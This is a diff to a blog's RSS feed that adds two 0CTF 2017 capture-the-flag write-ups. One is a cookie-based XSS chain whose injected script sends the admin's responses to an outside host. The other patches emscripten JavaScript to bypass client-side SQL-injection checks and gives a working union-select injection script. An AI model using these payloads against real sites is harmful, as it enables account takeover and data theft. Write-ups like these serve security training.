@@ -10,6 +10,199 @@
     <atom:link href="https://jiulongw.github.io/tags/ctf/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
+      <title>0CTF 2017 - Complicated XSS</title>
+      <link>https://jiulongw.github.io/post/0ctf-2017-complicated-xss/</link>
+      <pubDate>Mon, 20 Mar 2017 10:14:18 -0700</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/0ctf-2017-complicated-xss/</guid>
+      <description>&lt;p&gt;Cookies Monster&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Does this look familiar?&lt;br /&gt;
+&lt;a href=&#34;http://government.vip/&#34;&gt;http://government.vip/&lt;/a&gt;
+&lt;hr /&gt;
+XSS Book&lt;/p&gt;
+
+&lt;p&gt;The flag is in &lt;a href=&#34;http://admin.government.vip:8000&#34;&gt;http://admin.government.vip:8000&lt;/a&gt;&lt;br /&gt;
+Bruteforce and scanning are not needed!&lt;br /&gt;
+Admin will be hit by your payload&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Login to admin page with pre-populated test account, we can see there are two cookies: &lt;code&gt;username&lt;/code&gt; and &lt;code&gt;session&lt;/code&gt;, and the
+page says &amp;ldquo;only admin can upload shell&amp;rdquo;.  Seems like we need to XSS admin to upload something.  The &lt;code&gt;session&lt;/code&gt; cookie is
+an HTTP cookie that cannot be accessed by script.  The &lt;code&gt;username&lt;/code&gt; cookie however, is an XSS point.  Server reads &lt;code&gt;username&lt;/code&gt;
+cookie content and displayed it as raw HTML.&lt;/p&gt;
+
+&lt;p&gt;Now comes the tricky part: in the document header of admin page, some core component is stripped out.  Making AJAX call
+will fail since there&amp;rsquo;s no &lt;code&gt;XMLHttpRequest&lt;/code&gt;.  I also tried &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API&#34;&gt;Fetch API&lt;/a&gt; which works locally but server&amp;rsquo;s browser
+doesn&amp;rsquo;t support it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;script&amp;gt;
+//sandbox
+delete window.Function;
+delete window.eval;
+delete window.alert;
+delete window.XMLHttpRequest;
+delete window.Proxy;
+delete window.Image;
+delete window.postMessage;
+&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Poking around and I found out that the embedded &lt;code&gt;iframe&lt;/code&gt; element still have &lt;code&gt;XMLHttpRequest&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Another trick that blocked me for quite a while is that the admin page only renders upload form if &lt;code&gt;username&lt;/code&gt; cookie is
+&amp;ldquo;admin&amp;rdquo;.  So we need to reset cookie and fetch admin page again to see what parameters are needed for upload.
+Otherwise, it keeps hitting &lt;code&gt;400: bad request&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;h1&amp;gt;Hello admin&amp;lt;/h1&amp;gt;
+
+&amp;lt;p&amp;gt;Upload your shell&amp;lt;/p&amp;gt;
+&amp;lt;form action=&amp;quot;/upload&amp;quot; method=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
+&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;file&amp;quot; name=&amp;quot;file&amp;quot;&amp;gt;&amp;lt;/input&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;p&amp;gt;&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;upload&amp;quot;&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Here&amp;rsquo;s the XSS payload.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;document.cookie=&amp;quot;username=&amp;lt;iframe&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;script src=&#39;http://.../a.js&#39;&amp;gt;&amp;lt;/script&amp;gt;;path=/;domain=.government.vip&amp;quot;;
+window.location=&amp;quot;http://admin.government.vip:8000&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;a.js&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;document.cookie=&amp;quot;username=admin&amp;quot;;
+
+var xhr = new frames[0].XMLHttpRequest;
+xhr.onreadystatechange = function() {
+  if (xhr.readyState === 4) {
+    var result = xhr.responseText;
+    result += &amp;quot;,&amp;quot;;
+    result += xhr.status;
+    result += &amp;quot;,&amp;quot;;
+    result += xhr.getAllResponseHeaders();
+    window.location=&amp;quot;http://.../?a=&amp;quot; + btoa(result);
+  }
+}
+
+xhr.open(&#39;POST&#39;, &#39;/upload&#39;, true);
+
+var fblob = new Blob([&amp;quot;any content here&amp;quot;]);
+var formData = new FormData();
+formData.append(&amp;quot;file&amp;quot;, fblob);
+
+xhr.send(formData);
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Decoded response:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;flag{xss_is_fun_2333333},200,Server: TornadoServer/4.4.2
+Content-Length: 24
+Content-Type: text/html; charset=utf-8
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+    <item>
+      <title>0CTF 2017 - KoG</title>
+      <link>https://jiulongw.github.io/post/0ctf-2017-kog/</link>
+      <pubDate>Sun, 19 Mar 2017 21:11:57 -0700</pubDate>
+      
+      <guid>https://jiulongw.github.io/post/0ctf-2017-kog/</guid>
+      <description>&lt;p&gt;Do you know you can run your C++ program in browser?&lt;/p&gt;
+
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h1 id=&#34;problem&#34;&gt;Problem&lt;/h1&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;King of Glory is a funny game. Our website has a list of players.&lt;br /&gt;
+&lt;a href=&#34;http://202.120.7.213:11181&#34;&gt;http://202.120.7.213:11181&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
+&lt;p&gt;Hitting the given URL doesn&amp;rsquo;t show anything interesting, but the page source code indicating it was looking for &lt;code&gt;id&lt;/code&gt;
+parameter.  So try it with &lt;code&gt;?id=1&lt;/code&gt;, we can see it made a request to api.php with some interesting parameters.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;http://202.120.7.213:11181/api.php?id=1&amp;amp;hash=035c6d4adf335c31e884796a11a2590f&amp;amp;time=1489983725
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Ha, looks like it hashes &lt;code&gt;id&lt;/code&gt; using current time as salt and use that hash to validate at server side for integrity.
+If you try to put some SQLi stuff in &lt;code&gt;id&lt;/code&gt;, it will reject hash generation, which happens in client side.
+So the goal is pretty straightforward: bypass client side SQLi detection, generate hash and inject the server!&lt;/p&gt;
+
+&lt;p&gt;Now it comes the hard part: the &lt;a href=&#34;https://jiulongw.github.io/0ctf-2017/functionn.js&#34;&gt;hash generation code&lt;/a&gt; is the most complex Javascript code I have ever seen.  Tracing
+into &lt;code&gt;Module.main&lt;/code&gt;, I see memory allocators, function maps, and even function name that suggests system calls.
+What The Heck!&lt;/p&gt;
+
+&lt;p&gt;Googling around I figured it out: it was compiled from C/C++, using &lt;a href=&#34;http://kripken.github.io/emscripten-site&#34;&gt;emscripten&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+&lt;p&gt;Emscripten is an LLVM-based project that compiles C and C++ into highly-optimizable JavaScript in asm.js format.
+This lets you run C and C++ on the web at near-native speed, without plugins.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The bad news, there is little, if not none, tools to reverse engineer generated Javascript code.&lt;/p&gt;
+
+&lt;p&gt;The good news, it is still plain text, far better than ELF binary. It is easy to inject tracing code, run it with and
+without SQLi characters and compare the call sequence to find out where to apply patches.&lt;/p&gt;
+
+&lt;p&gt;The function in question was &lt;code&gt;__Z10user_inputNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEEE&lt;/code&gt;. After
+commenting out following two if blocks, it generates hash for any input.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;if (!($13)) {
+ ;HEAP32[$agg$result&amp;gt;&amp;gt;2]=HEAP32[$s&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+4&amp;gt;&amp;gt;2]=HEAP32[$s+4&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+8&amp;gt;&amp;gt;2]=HEAP32[$s+8&amp;gt;&amp;gt;2]|0;
+ ;HEAP32[$s&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+4&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+8&amp;gt;&amp;gt;2]=0|0;
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
+ STACKTOP = sp;return;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;if ((label|0) == 12) {
+ ;HEAP32[$agg$result&amp;gt;&amp;gt;2]=HEAP32[$s&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+4&amp;gt;&amp;gt;2]=HEAP32[$s+4&amp;gt;&amp;gt;2]|0;HEAP32[$agg$result+8&amp;gt;&amp;gt;2]=HEAP32[$s+8&amp;gt;&amp;gt;2]|0;
+ ;HEAP32[$s&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+4&amp;gt;&amp;gt;2]=0|0;HEAP32[$s+8&amp;gt;&amp;gt;2]=0|0;
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($te);
+ __ZNSt3__112basic_stringIcNS_11char_traitsIcEENS_9allocatorIcEEED2Ev($s);
+ STACKTOP = sp;return;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Now it becomes a simple SQLi task.  First use &lt;code&gt;order by&lt;/code&gt; trick to find out number of columns in the &lt;code&gt;select&lt;/code&gt; statement.
+Then query &lt;code&gt;information_schema.tables&lt;/code&gt; and &lt;code&gt;information_schema.columns&lt;/code&gt; to find table and column in question.&lt;/p&gt;
+
+&lt;p&gt;It is handy to write a simple &lt;code&gt;main.js&lt;/code&gt; that does the hash and curl so no need to copy-paste around.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-javascript&#34;&gt;var Module = require(&#39;./functionn.js&#39;);
+
+var q = process.argv[2];
+var hash = Module.main(q).split(&#39;|&#39;);
+
+var req = &#39;http://202.120.7.213:11181/api.php?id=&#39; + encodeURI(q) + &#39;&amp;amp;hash=&#39; + hash[0] + &#39;&amp;amp;time=&#39; + hash[1]
+console.log(req);
+
+var spawn = require(&#39;child_process&#39;).spawn;
+var curl = spawn(&#39;curl&#39;, [req]);
+
+curl.stdout.on(&#39;data&#39;, (data) =&amp;gt; {
+  console.log(`response: ${data}`);
+});
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;$ node main.js &amp;quot;1 union all select 1,hey from fl4g&amp;quot;
+http://202.120.7.213:11181/api.php?id=1%20union%20all%20select%201,hey%20from%20fl4g&amp;amp;hash=c2f05acaf2f91ba81b8c9b3ce2304da7&amp;amp;time=1489882992
+response: EaseSingle Qinflag{emScripten_is_Cut3_right?}
+&lt;/code&gt;&lt;/pre&gt;</description>
+    </item>
+    
+    <item>
       <title>BKP 2017 - Accelerated.zone</title>
       <link>https://jiulongw.github.io/post/boston-key-party-2017-accelerated-zone/</link>
       <pubDate>Sun, 26 Feb 2017 21:39:54 -0800</pubDate>
@@ -167,6 +360,8 @@ and blocked the order system on Shobot.&lt;/p&gt;
 &lt;p&gt;Running on: shobot.teaser.insomnihack.ch&lt;/p&gt;
 &lt;/blockquote&gt;
 
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
 &lt;p&gt;The website itself is pretty simple.  It has very simple javascript which is only used to show / hide menus.  It is a
 PHP session based cart system where you can add items to cart, validate and reset the cart, etc.  The admin page requires
 authentication which is the target of this challenge.&lt;/p&gt;
@@ -266,7 +461,9 @@ rogue AI.&lt;/p&gt;
 for a given part, you should be able to find the corresponding flag and move on to the next part.&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;h1 id=&#34;part-i-forensics-50-pts&#34;&gt;Part I - Forensics - 50 pts&lt;/h1&gt;
+&lt;h1 id=&#34;solution&#34;&gt;Solution&lt;/h1&gt;
+
+&lt;h2 id=&#34;part-i-forensics-50-pts&#34;&gt;Part I - Forensics - 50 pts&lt;/h2&gt;
 
 &lt;p&gt;It all begins with the pcap file.  After loading it with the favourite &lt;a href=&#34;https://www.wireshark.org/&#34;&gt;Wireshark&lt;/a&gt;, couple
 of interesting packets caught my eyes:&lt;/p&gt;
@@ -302,7 +499,7 @@ I have server&amp;rsquo;s private key.  But wait a minute, isn&amp;rsquo;t it ss
 
 &lt;p&gt;&lt;img src=&#34;https://jiulongw.github.io/img/insomnihack-2017/the-great-escape-flag-1.png&#34; alt=&#34;Part I Flag&#34; /&gt;&lt;/p&gt;
 
-&lt;h1 id=&#34;part-ii-web-200-pts&#34;&gt;Part II - Web - 200 pts&lt;/h1&gt;
+&lt;h2 id=&#34;part-ii-web-200-pts&#34;&gt;Part II - Web - 200 pts&lt;/h2&gt;
 
 &lt;p&gt;Now that the SSL packets are decrypted, we can find the file Rogue uploaded to SSC in packet #2437, as shown below.
 However, SSC is so secure that it has another level of encryption in addition to SSL.&lt;/p&gt;
